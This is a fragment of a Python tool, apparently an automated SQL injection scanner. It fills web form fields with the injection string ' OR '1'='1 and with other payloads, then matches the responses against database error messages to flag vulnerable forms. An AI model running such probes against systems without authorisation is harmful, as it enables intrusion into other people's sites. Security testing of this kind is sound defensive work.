# Additional Debugging: Print response details
def send_request(url, data=None, headers=None):
    try:
        if data:
            response = requests.post(url, data=data, headers=headers, timeout=10)
        else:
            response = requests.get(url, headers=headers, timeout=10)
        print(f"Response Status Code: {response.status_code}")
        print(f"Response Content: {response.text[:200]}")  # Print first 200 characters for debugging
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

# Expanded error signatures for better detection
sql_error_signatures = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate[hy000]",
    "microsoft odbc",
    "syntax error",
    "ora-00933",  # Oracle SQL Error
    "fatal error",  # General errors
    "sql error",  # Generic SQL error
    "database error",  # Generic database error
]

# Enhanced form handling to include textarea and select elements
def test_form(url, form, method, headers=None):
    action_url = form.get('action', '')
    if not action_url.startswith("http"):
        action_url = urljoin(url, action_url)

    # Extract form inputs
    inputs = form.find_all(['input', 'textarea', 'select'])
    data = {}
    for input_tag in inputs:
        name = input_tag.get('name', '')
        if name:
            input_type = input_tag.get('type', 'text')
            if input_type in ['hidden', 'text', 'textarea']:
                data[name] = "' OR '1'='1"
            elif input_type == 'password':
                data[name] = "' OR '1'='1"
            elif input_type == 'select':
                options = input_tag.find_all('option')
                if options:
                    data[name] = options[0].get('value', 'test')
            else:
                data[name] = 'test'

    # Test each payload
    for payload in sql_payloads:
        for key in data.keys():
            data[key] = payload
            print(f"Testing with payload: {payload}")
            if method == 'post':
                response = send_request(action_url, data=data, headers=headers)
            else:
                response = send_request(action_url + "?" + "&".join([f"{k}={v}" for k, v in data.items()]), headers=headers)

            if response and response.status_code == 200:
                for error_signature in sql_error_signatures:
                    if error_signature in response.text.lower():
                        print(f"[!] Potential SQL Injection vulnerability detected with payload: {payload}")
                        return True
            time.sleep(0.5)  # Avoid overwhelming the server
    return False
